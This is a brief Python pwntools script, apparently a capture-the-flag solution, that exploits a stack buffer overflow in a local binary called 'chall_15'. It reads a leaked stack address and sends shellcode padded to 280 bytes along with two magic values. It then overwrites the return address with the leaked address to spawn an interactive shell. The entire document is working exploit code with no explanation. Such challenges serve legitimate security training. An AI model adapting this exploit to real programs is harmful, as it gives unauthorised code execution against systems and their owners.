# coding: utf-8
from pwn import *
p = process("./chall_15")
p.recvuntil(b"\n")
inpStartLeak = p.recvline()
inpStartLeak = int(inpStartLeak, 16)
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + b"A"*(280-len(shellcode)) + p32(0xdeadd00d) + p32(0xb16b00b5) + b"A"*8 + p64(inpStartLeak)
p.sendline(payload)
p.interactive()
